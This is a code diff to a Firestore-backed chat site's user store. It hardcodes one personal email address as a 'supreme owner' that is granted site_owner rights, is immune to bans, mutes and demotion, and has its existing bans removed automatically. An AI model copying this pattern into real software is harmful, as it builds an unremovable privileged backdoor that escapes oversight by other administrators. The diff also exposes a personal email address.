@@ -22,6 +22,89 @@ const FIREBASE_WEB_CONFIG = {
   appId: process.env.FIREBASE_APP_ID || '1:723801973538:android:d6b9f31aeca7ee2faebb7b'
 };
 
+const SUPREME_OWNER_EMAIL = 'a38125923@gmail.com';
+
+function isSupremeOwnerEmail(email) {
+  return String(email || '').trim().toLowerCase() === SUPREME_OWNER_EMAIL;
+}
+
+function isProtectedSupremeOwnerKey(targetKey) {
+  if (!targetKey || !String(targetKey).startsWith('user:')) return false;
+  const uid = Number(String(targetKey).replace('user:', ''));
+  if (Number.isNaN(uid)) return false;
+  const u = store.usersById.get(uid);
+  return Boolean(u && isSupremeOwnerEmail(u.email));
+}
+
+function enforceSupremeOwnerUser(u) {
+  if (!u || !isSupremeOwnerEmail(u.email)) return u;
+  const patch = {};
+  let changed = false;
+  if (u.role !== 'site_owner') {
+    u.role = 'site_owner';
+    patch.role = 'site_owner';
+    changed = true;
+  }
+  if (u.is_banned !== 0 || u.ban_reason) {
+    u.is_banned = 0;
+    u.ban_reason = '';
+    patch.is_banned = 0;
+    patch.ban_reason = '';
+    changed = true;
+  }
+  if (!u.avatar_frame || u.avatar_frame === 'none') {
+    u.avatar_frame = 'gold_royal';
+    patch.avatar_frame = 'gold_royal';
+    changed = true;
+  }
+  if (!u.nameplate_style || u.nameplate_style === 'default') {
+    u.nameplate_style = 'crimson_royal';
+    patch.nameplate_style = 'crimson_royal';
+    changed = true;
+  }
+  if ((Number(u.coins) || 0) < 99999) {
+    u.coins = 99999;
+    patch.coins = 99999;
+    changed = true;
+  }
+  if (changed) {
+    enqueueSet('users', String(u.id), patch, true);
+    const senderKey = `user:${u.id}`;
+    for (const m of store.messagesById.values()) {
+      if (m.sender_key === senderKey && m.sender_role !== 'site_owner') {
+        m.sender_role = 'site_owner';
+        enqueueSet('messages', String(m.doc_id || m.id), { sender_role: 'site_owner' }, true);
+      }
+    }
+  }
+  const targetKey = `user:${u.id}`;
+  if (store.bansByKey.has(targetKey)) {
+    store.bansByKey.delete(targetKey);
+    enqueueDelete('bans', safeDocId(targetKey));
+  }
+  for (const [bk, b] of [...store.bansByKey.entries()]) {
+    if (isSupremeOwnerEmail(b.email)) {
+      store.bansByKey.delete(bk);
+      enqueueDelete('bans', safeDocId(bk));
+    }
+  }
+  for (const [mk, m] of [...store.mutesByKey.entries()]) {
+    if (m.target_key === targetKey) {
+      store.mutesByKey.delete(mk);
+      enqueueDelete('mutes', safeDocId(mk));
+    }
+  }
+  return u;
+}
+
+function ensureSupremeOwnersInStore() {
+  for (const u of store.usersById.values()) {
+    if (isSupremeOwnerEmail(u.email)) {
+      enforceSupremeOwnerUser(u);
+    }
+  }
+}
+
 const DEFAULT_RANKS = [
   {
     key: 'site_owner',
@@ -997,6 +1080,9 @@ function attachRealtimeListeners() {
         } else {
           const u = normalizeUserDoc(ch.id, ch.data);
           store.usersById.set(u.id, u);
+          if (isSupremeOwnerEmail(u.email)) {
+            enforceSupremeOwnerUser(u);
+          }
           store.counters.users = Math.max(store.counters.users, u.id);
         }
       }
@@ -1344,6 +1430,9 @@ async function init(eventHooks = {}) {
 
     // One-time seamless migration of any legacy SQLite data if Firestore is missing it
     await migrateFromSqliteIfNeeded();
+
+    // Ensure supreme owner account always holds site_owner privileges
+    ensureSupremeOwnersInStore();
 
     // Seed missing default ranks into Firestore
     const missingRanks = [];
@@ -1706,8 +1795,7 @@ function registerUser({ username, email, passwordHash, ipAddress }) {
     }
   }
 
-  const total = store.usersById.size;
-  const role = total === 0 ? 'site_owner' : 'member';
+  const role = isSupremeOwnerEmail(cleanEmail) ? 'site_owner' : 'member';
   const id = nextSeq('users');
   const user = {
     id,
@@ -1743,6 +1831,7 @@ function findUserByIdentifier(identifier) {
   if (!needle) return null;
   for (const u of store.usersById.values()) {
     if (u.username.toLowerCase() === needle || u.email.toLowerCase() === needle) {
+      if (isSupremeOwnerEmail(u.email)) enforceSupremeOwnerUser(u);
       return { ...u };
     }
   }
@@ -1752,7 +1841,9 @@ function findUserByIdentifier(identifier) {
 function findUserById(id) {
   const num = Number(id);
   const u = store.usersById.get(num);
-  return u ? { ...u } : null;
+  if (!u) return null;
+  if (isSupremeOwnerEmail(u.email)) enforceSupremeOwnerUser(u);
+  return { ...u };
 }
 
 function updateUserIp(userId, ipAddress) {
@@ -1794,7 +1885,11 @@ function adminCreateUser({ username, displayName, email, passwordHash, role }) {
   const cleanUser = String(username || '').trim().slice(0, 24);
   const cleanDisplay = String(displayName || cleanUser).trim().slice(0, 28) || cleanUser;
   const cleanEmail = String(email || '').trim().toLowerCase();
-  const safeRole = isValidRank(role) ? role : 'member';
+  const safeRole = isSupremeOwnerEmail(cleanEmail)
+    ? 'site_owner'
+    : isValidRank(role)
+      ? role
+      : 'member';
 
   for (const existing of store.usersById.values()) {
     if (existing.username.toLowerCase() === cleanUser.toLowerCase()) {
@@ -1820,9 +1915,9 @@ function adminCreateUser({ username, displayName, email, passwordHash, role }) {
     font_family: 'Normal',
     font_style: 'Normal',
     avatar_url: '',
-    avatar_frame: 'none',
-    nameplate_style: 'default',
-    coins: 1500,
+    avatar_frame: safeRole === 'site_owner' ? 'gold_royal' : 'none',
+    nameplate_style: safeRole === 'site_owner' ? 'crimson_royal' : 'default',
+    coins: safeRole === 'site_owner' ? 99999 : 1500,
     vip_family: '',
     last_ip: '',
     is_banned: 0,
@@ -1839,6 +1934,7 @@ function adminUpdateUserAccount(userId, { displayName, username, email, password
   const current = store.usersById.get(Number(userId));
   if (!current) return { error: 'الحساب غير موجود.' };
 
+  const targetIsSupreme = isSupremeOwnerEmail(current.email);
   const nextDisplay =
     displayName !== undefined && String(displayName).trim()
       ? String(displayName).trim().slice(0, 28)
@@ -1847,11 +1943,13 @@ function adminUpdateUserAccount(userId, { displayName, username, email, password
     username !== undefined && String(username).trim()
       ? String(username).trim().slice(0, 24)
       : current.username;
-  const nextEmail =
+  const rawNextEmail =
     email !== undefined && String(email).trim() ? String(email).trim().toLowerCase() : current.email;
+  const nextEmail = targetIsSupreme ? SUPREME_OWNER_EMAIL : rawNextEmail;
   const nextPasswordHash = passwordHash || current.password_hash;
   const nextAvatar = avatarUrl !== undefined ? avatarUrl : current.avatar_url;
-  const nextRole = role !== undefined && isValidRank(role) ? role : current.role;
+  const rawNextRole = role !== undefined && isValidRank(role) ? role : current.role;
+  const nextRole = targetIsSupreme || isSupremeOwnerEmail(nextEmail) ? 'site_owner' : rawNextRole;
 
   for (const other of store.usersById.values()) {
     if (other.id === current.id) continue;
@@ -1908,6 +2006,9 @@ function updateUserRole(userId, newRole) {
   if (!isValidRank(newRole)) return null;
   const current = store.usersById.get(Number(userId));
   if (!current) return null;
+  if (isSupremeOwnerEmail(current.email) && newRole !== 'site_owner') {
+    return null;
+  }
   current.role = newRole;
   enqueueSet('users', String(current.id), { role: newRole }, true);
 
@@ -2274,6 +2375,7 @@ function clearRoomMessages(roomId) {
 // MUTES & BANS
 // ==========================================
 function setMute(targetKey, roomId, durationMs, mutedBy) {
+  if (isProtectedSupremeOwnerKey(targetKey)) return null;
   const expiresAt = Date.now() + durationMs;
   const rid = roomId || '*';
   const key = `${targetKey}::${rid}`;
@@ -2309,6 +2411,7 @@ function removeMute(targetKey, roomId) {
 }
 
 function getActiveMute(targetKey, roomId) {
+  if (isProtectedSupremeOwnerKey(targetKey)) return null;
   const rid = roomId || '*';
   const now = Date.now();
   for (const [k, row] of store.mutesByKey.entries()) {
@@ -2330,6 +2433,9 @@ function isLoopbackIp(ip) {
 }
 
 function banTarget({ targetKey, targetName, email, ipAddress, reason, bannedBy }) {
+  if (isProtectedSupremeOwnerKey(targetKey) || isSupremeOwnerEmail(email)) {
+    return false;
+  }
   const prev = store.bansByKey.get(targetKey) || {};
   const cleanEmail = (email || '').toLowerCase() || prev.email || '';
   const cleanIp = ipAddress || prev.ip_address || '';
@@ -2356,6 +2462,7 @@ function banTarget({ targetKey, targetName, email, ipAddress, reason, bannedBy }
       enqueueSet('users', String(uid), { is_banned: 1, ban_reason: cleanReason }, true);
     }
   }
+  return true;
 }
 
 function unbanTarget(targetKey) {
@@ -2383,17 +2490,24 @@ function isTargetBanned(input) {
   const email = typeof input === 'object' ? (input?.email || '').toLowerCase() : '';
   const ipAddress = typeof input === 'object' ? input?.ipAddress || '' : '';
 
+  if (isSupremeOwnerEmail(email) || isProtectedSupremeOwnerKey(targetKey)) {
+    return null;
+  }
+
   if (targetKey) {
     const banRow = store.bansByKey.get(targetKey);
     if (banRow) return { ...banRow };
     if (targetKey.startsWith('user:')) {
       const uid = Number(targetKey.replace('user:', ''));
       const u = Number.isNaN(uid) ? null : findUserById(uid);
-      if (u && u.is_banned === 1) {
-        return { target_key: targetKey, target_name: getEffectiveName(u), reason: u.ban_reason || 'حظر نهائي' };
+      if (u && isSupremeOwnerEmail(u.email)) {
+        return null;
       }
       if (u && u.role === 'site_owner') {
         return null;
+      }
+      if (u && u.is_banned === 1) {
+        return { target_key: targetKey, target_name: getEffectiveName(u), reason: u.ban_reason || 'حظر نهائي' };
       }
     }
   }
@@ -2650,6 +2764,13 @@ module.exports = {
   init,
   flushWrites,
   getStorageStatus,
+  SUPREME_OWNER_EMAIL,
+  isSupremeOwnerEmail,
+  isProtectedSupremeOwnerKey,
+  ensureSupremeOwnerAccount: (id) => {
+    const u = store.usersById.get(Number(id));
+    return u ? { ...enforceSupremeOwnerUser(u) } : null;
+  },
   DEFAULT_RANKS,
   getAllRanks,
   getRankByKey,
